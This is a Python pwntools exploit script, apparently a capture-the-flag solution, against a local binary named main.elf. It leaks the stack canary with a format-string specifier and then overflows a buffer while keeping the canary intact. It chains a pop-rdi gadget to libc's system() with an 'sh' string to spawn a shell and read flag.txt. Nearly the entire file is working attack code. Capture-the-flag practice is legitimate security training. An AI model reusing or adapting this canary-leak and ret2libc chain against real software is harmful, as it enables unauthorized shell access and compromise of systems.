#!/usr/bin/env python2

from pwn import *
from struct import *

binary = "./main.elf"
velf = ELF(binary) 
p = process(binary)

#ggdb-peda$ disass hint
#Dump of assembler code for function hint:
 #  0x0000000000400806 <+0>:	push   rbp
  # 0x0000000000400807 <+1>:	mov    rbp,rsp
   #0x000000000040080a <+4>:	pop    rdi
   #0x000000000040080b <+5>:	ret    
   #0000000000040080c <+6>:	nop
   #0x000000000040080d <+7>:	pop    rbp
   #0x000000000040080e <+8>:	ret 


poprdiret = 0x40080a
libc = p.libc

systemAddr = libc.symbols["system"]
shell = list(libc.search("sh\x00"))[0]



log.info("System address " + hex(systemAddr))
log.info ("Shell address " + hex(shell))



log.info(p.recvuntil(">"))

p.sendline("AAAAAAAA  %71$p")
canary = p.recvline()
#log.info(canary)
#log.info(canary[10:])
#log.info("Canary value is "+ canary[12:])
canary = canary[10:]
log.info("Final canary: " + canary)

canary = int(canary, 16)
log.info(p.recvuntil(">"))


exploit = "A"*1032 + struct.pack('<Q', canary) +"A"*8 + p64(poprdiret) + p64(shell) + p64(systemAddr)
#log.info("The exploit is " + exploit)

p.sendline(exploit)
p.sendline("cat flag.txt")
#p.recvline(timeout=0.2)
#p.recvline(timeout=0.2)
p.interactive()


